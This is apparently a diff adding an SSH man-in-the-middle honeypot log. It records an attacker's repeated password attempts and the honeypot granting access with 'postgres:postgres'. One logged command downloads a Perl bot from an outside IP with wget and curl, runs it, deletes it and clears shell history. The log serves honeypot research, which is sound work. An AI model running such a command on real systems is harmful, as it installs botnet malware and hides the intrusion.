@@ -1,0 +1,41 @@
+2020-10-26 11:44:28.124 - [Info] MITM Version: 1.26
+2020-10-26 11:44:28.131 - [Info] Auto Access Enabled: true
+2020-10-26 11:44:28.131 - [Debug] [Init] Auto Access Barrier: true
+2020-10-26 11:44:28.156 - [Info] SSH man-in-the-middle server for 172.20.0.201 listening on 0.0.0.0:10000
+2020-10-26 11:44:30.393 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:44:32.297 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:44:32.299 - [Debug] [Auto Access] Attacker: 34.80.219.76, Threshold: 1, Attempts: 1
+2020-10-26 11:44:32.300 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-26 11:44:32.300 - [Debug] [Auto Access] Adding the following credentials: "postgres:postgres"
+2020-10-26 11:44:33.366 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-26 11:44:33.366 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-10-26 11:44:47.371 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:44:48.843 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-26 11:44:49.296 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:44:49.298 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-26 11:44:49.300 - [Debug] [Auth] Attacker: 34.80.219.76 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-26 11:44:49.689 - [Debug] [EXEC] Noninteractive mode attacker command: cat /etc/issue ; wget 45.153.203.209/bot.pl ; perl bot.pl ; rm -rf bot.pl ; curl -O 45.153.203.209/bot.pl ; perl bot.pl ; history -c ; rm -rf bot.pl
+2020-10-26 11:44:49.727 - [Debug] [Connection] Attacker closed the connection
+2020-10-26 11:45:03.379 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:45:05.259 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:45:05.261 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-26 11:45:05.262 - [Debug] [Auth] Attacker: 34.80.219.76 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-26 11:45:05.667 - [Debug] [Connection] Attacker closed the connection
+2020-10-26 11:45:19.506 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:45:21.023 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:45:21.024 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-26 11:45:21.024 - [Debug] [Auth] Attacker: 34.80.219.76 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-26 11:45:21.434 - [Debug] [Connection] Attacker closed the connection
+2020-10-26 11:45:36.132 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:45:38.337 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:45:38.338 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-26 11:45:38.339 - [Debug] [Auth] Attacker: 34.80.219.76 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-26 11:45:38.750 - [Debug] [Connection] Attacker closed the connection
+2020-10-26 11:45:52.238 - [Debug] [Connection] Attacker connected: 34.80.219.76 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-26 11:45:53.822 - [Debug] [Auth] Attacker 34.80.219.76 trying to authenticate with "password"
+2020-10-26 11:45:53.823 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-26 11:45:53.824 - [Debug] [Auth] Attacker: 34.80.219.76 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-26 11:45:53.985 - [Debug] [Connection] Attacker closed connection
+2020-10-26 11:45:54.001 - [Debug] [Connection] Attacker closed the connection
+2020-10-26 11:45:54.007 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-26 11:45:54.007 - [Debug] [LXC] Container's OpenSSH server closed connection
